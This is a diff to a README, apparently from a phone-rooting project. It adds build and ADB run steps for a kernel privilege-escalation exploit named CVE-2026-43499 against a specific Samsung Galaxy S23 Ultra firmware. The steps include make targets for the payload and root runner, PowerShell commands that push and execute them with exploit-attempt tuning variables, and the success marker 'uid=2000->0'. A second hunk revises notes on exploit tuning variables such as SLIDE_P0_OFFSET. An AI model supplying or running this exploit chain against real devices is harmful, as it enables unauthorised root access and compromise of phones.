@@ -83,6 +83,61 @@ build/dm3q-S918BXXSAFZF5-mcast/cve-2026-43499-app.release.so
 build/dm3q-S918BXXSAFZF5-sigreturn/cve-2026-43499-app.release.so
 ```
 
+## Fast ADB shell test without an APK
+
+This runs the same app payload constructor through the repository's common
+`--run-payload` loader. It is useful for a quick end-to-end writer, ARW,
+physrw, and root test before rebuilding the APK. It runs as `uid=2000` in the
+shell SELinux domain, so it does not prove that the app-domain launch is good.
+
+Build the selected payload and its loader in one command:
+
+```sh
+make TARGET=dm3q-S918BXXSAFZF5 \
+  STACK_WRITER=mcast \
+  OUTDIR=build/dm3q-fzf5-shell \
+  ANDROID_NDK_HOME=/path/to/android-ndk \
+  shell-bundle
+```
+
+Use `STACK_WRITER=sigreturn` instead to test the backup. The two files needed
+on the phone are:
+
+```text
+build/dm3q-fzf5-shell/cve-2026-43499-app.release.so
+build/dm3q-fzf5-shell/cve-2026-43499-root
+```
+
+On Windows PowerShell, set the exact serial shown by `adb devices`, then push,
+verify, and run:
+
+```powershell
+$serial = 'YOUR_DEVICE_SERIAL'
+$out = 'build\dm3q-fzf5-shell'
+$remotePayload = '/data/local/tmp/rmg-s918b-fzf5-app.so'
+$remoteRunner = '/data/local/tmp/rmg-cve43499-root'
+$remoteLog = '/data/local/tmp/rmg-s918b-fzf5-shell.log'
+
+adb -s $serial push "$out\cve-2026-43499-app.release.so" $remotePayload
+adb -s $serial push "$out\cve-2026-43499-root" $remoteRunner
+adb -s $serial shell "chmod 0644 $remotePayload; chmod 0755 $remoteRunner; rm -f $remoteLog; toybox sha256sum $remotePayload $remoteRunner"
+
+adb -s $serial shell "EXPLOIT_ATTEMPTS=24 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 $remoteRunner --run-payload $remotePayload $remoteRunner $remoteLog"
+
+adb -s $serial pull $remoteLog .\rmg-s918b-fzf5-shell.log
+```
+
+The runner mirrors the payload log to the current terminal and keeps the full
+copy at `$remoteLog`. If ADB drops, reconnect and pull that file. The app
+payload waits until boot uptime reaches 120 seconds, so a command started early
+may first print a boot quiet-window wait.
+
+Success has the same stage markers as the APK test, but the last line normally
+shows `uid=2000->0` instead of `uid=10000->0`. Test one writer per boot when
+kernel state after a failed run is not known. If shell succeeds but APK fails,
+the next comparison is app-domain SELinux/seccomp and launch state, not the
+shared writer or downstream root chain.
+
 ## Test from a locally built Root My Galaxy APK
 
 The current app already accepts `SM-S918B` with kernel `5.15.189` through the
@@ -219,11 +274,11 @@ All compile-time values below are in
 | `SIGRETURN_FPSIMD_WAITER_OFF` | 0x18 | Waiter offset in the no-SVE FPSIMD record. |
 | `SIGRETURN_SVE_WAITER_OFF` | 0x28 | Waiter offset in the SVE signal record. |
 
-Useful runtime controls are `RMG_FAST`, `SLUB_DIAG`, and
-`SLIDE_ENTER_DELAY_USEC` (legacy alias: `PSELECT_DELAY_USEC`).
-`SLIDE_P0_OFFSET` forces a per-boot offset and is unsafe if guessed wrong; leave
-it unset for normal tests. Never change several tuning values at once: preserve
-the full before/after logs so a result can be attributed to one change.
+`SLIDE_ENTER_DELAY_USEC` (legacy alias: `PSELECT_DELAY_USEC`) controls the
+writer-entry delay. `SLIDE_P0_OFFSET` forces a per-boot offset and is unsafe if
+guessed wrong; leave it unset for normal tests. Never change several tuning
+values at once: preserve the full before/after logs so a result can be
+attributed to one change.
 
 ## QEMU validation record
 
